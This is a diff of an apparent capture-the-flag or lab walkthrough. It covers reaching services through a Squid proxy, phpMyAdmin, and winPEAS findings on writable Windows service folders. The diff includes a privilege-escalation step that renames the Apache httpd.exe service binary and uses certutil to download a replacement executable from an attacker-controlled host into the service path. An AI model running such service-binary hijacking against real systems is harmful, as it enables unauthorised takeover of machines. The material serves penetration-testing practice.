@@ -12,7 +12,9 @@ https://github.com/A1vinSmith/spose
 curl --proxy http://192.168.59.189:3128 http://192.168.59.189:8080
 ```
 
-working tho, Better to go with FoxyProxy. 
+Working tho, Better to go with FoxyProxy. 
+
+Also check another repo if Squid ask for Auth. https://github.com/A1vinSmith/Cloud-Hacking/tree/main/HackTheBox/Flustered#auth-squid
 
 ### Phpmyadmin
 http://192.168.59.189:8080/phpmyadmin/index.php
@@ -48,6 +50,7 @@ sed -n -e 1000,1500p winpeas_fast
 sed -n -e 1500,2000p winpeas_fast   -> Unquoted path
 ```
 
+```txt
 Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
     ApacheHTTPServer(Apache Software Foundation - Apache HTTP Server)["C:\wamp\bin\apache\apache2.4.46\bin\httpd.exe" -k runservice] - Auto - Running
     Possible DLL Hijacking in binary folder: C:\wamp\bin\apache\apache2.4.46\bin (Everyone [AllAccess], Users [AppendData/CreateDirectories WriteData/CreateFiles])
@@ -61,6 +64,8 @@ Check if you can overwrite some service binary or perform a DLL hijacking, also 
     squidsrv(Squid for Windows)[C:\Squid\bin\Diladele.Squid.Service.exe] - Auto - Running - isDotNet
     Possible DLL Hijacking in binary folder: C:\Squid\bin (Users [AppendData/CreateDirectories WriteData/CreateFiles])
     Reduces bandwidth and improves response times by caching and reusing frequently-requested web pages.
+```
+    
 ```
 move C:\wamp\bin\apache\apache2.4.46\bin\httpd.exe C:\wamp\bin\apache\apache2.4.46\bin\httpd.backup
 certutil -urlcache -f http://192.168.49.59/httpd.exe C:\wamp\bin\apache\apache2.4.46\bin\httpd.exe
